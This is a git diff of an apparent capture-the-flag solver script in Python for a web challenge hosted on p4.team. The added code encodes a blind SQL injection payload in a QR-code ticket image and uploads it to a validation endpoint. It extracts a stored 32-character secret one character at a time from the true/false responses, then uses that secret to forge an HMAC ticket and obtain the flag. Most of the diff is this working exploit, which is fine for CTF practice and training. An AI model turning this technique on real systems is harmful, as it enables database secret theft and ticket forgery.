@@ -1,8 +1,9 @@
+import hashlib
+import hmac
 import io
-import logging
 import qrcode
+import re
 import requests
-import http.client as http_client
 from PIL import Image
 
 
@@ -11,17 +12,10 @@ OFFSET = (350, 50)
 TICKET_PATH = 'free_ticket.png'
 LOGIN_URL = 'https://easy.web.uw2017.p4.team/login'
 VALIDATE_URL = 'https://easy.web.uw2017.p4.team/validate'
-TICKET_OK = 'Twój bilet jest poprawny  i znajduje się w naszej bazie danych'
-TICKET_WRONG = 'Twój bilet ma niepoprawny typ i nie znajduje się w naszej bazie danych'
-
-
-def debug_on():
-    http_client.HTTPConnection.debuglevel = 1
-    logging.basicConfig()
-    logging.getLogger().setLevel(logging.DEBUG)
-    requests_log = logging.getLogger("requests.packages.urllib3")
-    requests_log.setLevel(logging.DEBUG)
-    requests_log.propagate = True
+QUERY_OK = 'i znajduje się w naszej bazie danych'
+QUERY_WRONG = 'i nie znajduje się w naszej bazie danych'
+TICKET_OK = 'Twój bilet jest poprawny'
+TICKET_WRONG = 'Twój bilet ma niepoprawny typ'
 
 
 def create_code(content):
@@ -49,8 +43,15 @@ def create_ticket_file(content):
     return transform_to_byte_file(img)
 
 
+def hmac_ticket(user_secret, ticket_type):
+    return hmac.new(user_secret.encode('utf-8'), ticket_type.encode('utf-8'), hashlib.sha256).hexdigest()
+
+
 class EasyWeb():
     sess = None
+    reg = re.compile("<div class=\"alert alert-info\">([\w\W]*?)</div>")
+    uname_hash = None
+    user_secret = None
 
     def login(self, username, password):
         login_data = {
@@ -58,11 +59,12 @@ class EasyWeb():
             'password': password,
         }
 
+        self.uname_hash = hashlib.sha256(username.encode('utf-8')).hexdigest()
         self.sess = requests.session()
         response = self.sess.post(LOGIN_URL, data=login_data)
 
 
-    def check_ticket(self, content):
+    def check_ticket(self, content, print_info=False):
         ticket = create_ticket_file(content)
         files = {
             'ticket': ('ticket.png', ticket)
@@ -73,13 +75,47 @@ class EasyWeb():
             files=files,
         )
 
-        # print(response.text)
-        return TICKET_OK in response.text
+        if print_info:
+            print(content)
+
+            info = self.reg.search(response.text)
+            if info:
+                print(info.group(1).strip())
+            else:
+                print(response.text)
+
+
+        return QUERY_OK in response.text
+
+
+    def try_nth_char(self, n, ch):
+        return self.check_ticket('a" or substring((SELECT user_secret FROM {} limit 1), {}, 1) = "{}"#'
+            .format(self.uname_hash, n, ch))
+
+
+    def find_nth_char(self, n):
+        for c in '01234567890abcdef':
+            if self.try_nth_char(n, c):
+                return c
+
+
+    def find_user_secret(self):
+        user_secret = ''
+        for i in range(1, 33):
+            c = self.find_nth_char(i)
+            user_secret += c
+            print(user_secret)
+
+        self.user_secret = user_secret
+        return user_secret
 
 
 if __name__ == '__main__':
     ew = EasyWeb()
-    ew.login('tomek', 'kolejarz')
+    ew.login('bob', '1234')
 
-    r = ew.check_ticket("103b7c2f9abde8ab9f812f9e09b1acaabb8c46f1b5eefdfde65e00b654a0d3d7")
-    print(r)
+    user_secret = ew.find_user_secret()
+
+    t = hmac_ticket(user_secret, 'flaga')
+
+    ew.check_ticket(t, print_info=True)
